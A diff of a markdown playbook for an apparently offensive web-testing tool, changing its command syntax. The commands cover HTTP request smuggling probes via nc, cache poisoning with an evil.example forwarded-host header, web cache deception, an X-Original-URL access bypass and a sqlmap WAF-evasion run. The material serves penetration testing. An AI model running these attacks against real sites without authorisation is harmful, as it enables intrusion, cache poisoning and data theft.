@@ -11,8 +11,8 @@ Covers: HTTP request smuggling, HTTP/2 downgrade desync, web cache poisoning, we
 ## Architecture Fingerprinting
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I https://<target>/ | grep -iE "(server|via|x-served-by|x-cache|cf-ray|x-amz|x-varnish|x-fastly|x-akamai|x-sucuri|x-cdn)"'
-scripts/openghost.sh exec-tool wafw00f https://<target>
+openghost bash 'curl -s -I https://<target>/ | grep -iE "(server|via|x-served-by|x-cache|cf-ray|x-amz|x-varnish|x-fastly|x-akamai|x-sucuri|x-cdn)"'
+openghost run wafw00f https://<target>
 ```
 
 Edge testing is most relevant when you see:
@@ -73,7 +73,7 @@ Transfer-Encoding: chunked\r
 ### Low-Impact Probe Example
 
 ```bash
-scripts/openghost.sh exec-bash 'printf "POST / HTTP/1.1\r\nHost: <target>\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX" | nc <target> 80'
+openghost bash 'printf "POST / HTTP/1.1\r\nHost: <target>\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX" | nc <target> 80'
 ```
 
 ### Exploit Classes
@@ -104,7 +104,7 @@ Evidence requires showing different frontend/backend interpretation, not only HT
 ### Identify Cache
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I "https://<target>/?cb=$(date +%s)" | grep -iE "(x-cache|cf-cache-status|age|vary|x-varnish|via|cache-control)"'
+openghost bash 'curl -s -I "https://<target>/?cb=$(date +%s)" | grep -iE "(x-cache|cf-cache-status|age|vary|x-varnish|via|cache-control)"'
 ```
 
 ### Find Unkeyed Inputs
@@ -125,8 +125,8 @@ Host
 Tests:
 
 ```bash
-scripts/openghost.sh exec-bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Host: evil.example" "https://<target>/?$CB" | grep evil.example'
-scripts/openghost.sh exec-bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Scheme: http" "https://<target>/?$CB" | head -40'
+openghost bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Host: evil.example" "https://<target>/?$CB" | grep evil.example'
+openghost bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Scheme: http" "https://<target>/?$CB" | head -40'
 ```
 
 Confirmed when an unkeyed input is reflected in a cacheable response and can be served to another request without the malicious header.
@@ -143,8 +143,8 @@ Confirmed when an unkeyed input is reflected in a cacheable response and can be 
 ### Testing
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I -H "Cookie: session=<TEST_COOKIE>" https://<target>/account/settings/oghost.css | grep -iE "(cache|content-type|age)"'
-scripts/openghost.sh exec-bash 'curl -s https://<target>/account/settings/oghost.css | head -40'
+openghost bash 'curl -s -I -H "Cookie: session=<TEST_COOKIE>" https://<target>/account/settings/oghost.css | grep -iE "(cache|content-type|age)"'
+openghost bash 'curl -s https://<target>/account/settings/oghost.css | head -40'
 ```
 
 Use test accounts only.
@@ -196,7 +196,7 @@ Use cases:
 Example:
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -i -H "X-Original-URL: /admin" https://<target>/not-admin | head -80'
+openghost bash 'curl -s -i -H "X-Original-URL: /admin" https://<target>/not-admin | head -80'
 ```
 
 ## WAF and CDN Bypass
@@ -204,8 +204,8 @@ scripts/openghost.sh exec-bash 'curl -s -i -H "X-Original-URL: /admin" https://<
 ### Fingerprint First
 
 ```bash
-scripts/openghost.sh exec-tool wafw00f https://<target>
-scripts/openghost.sh exec-bash 'curl -s -I https://<target> | grep -iE "(cf-ray|x-sucuri|x-akamai|x-fastly|x-cdn|server)"'
+openghost run wafw00f https://<target>
+openghost bash 'curl -s -I https://<target> | grep -iE "(cf-ray|x-sucuri|x-akamai|x-fastly|x-cdn|server)"'
 ```
 
 ### General Techniques
@@ -226,7 +226,7 @@ Content-Type confusion: JSON -> text/plain -> form
 sqlmap tamper example:
 
 ```bash
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
+openghost run sqlmap -u "https://<target>/?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
 ```
 
 ### XSS WAF Bypass Examples
@@ -243,7 +243,7 @@ scripts/openghost.sh exec-tool sqlmap -u "https://<target>/?id=1" --tamper=space
 Check whether users can be downgraded to HTTP:
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I http://<target> | grep -iE "(location|strict-transport)"'
+openghost bash 'curl -s -I http://<target> | grep -iE "(location|strict-transport)"'
 ```
 
 Weaknesses:
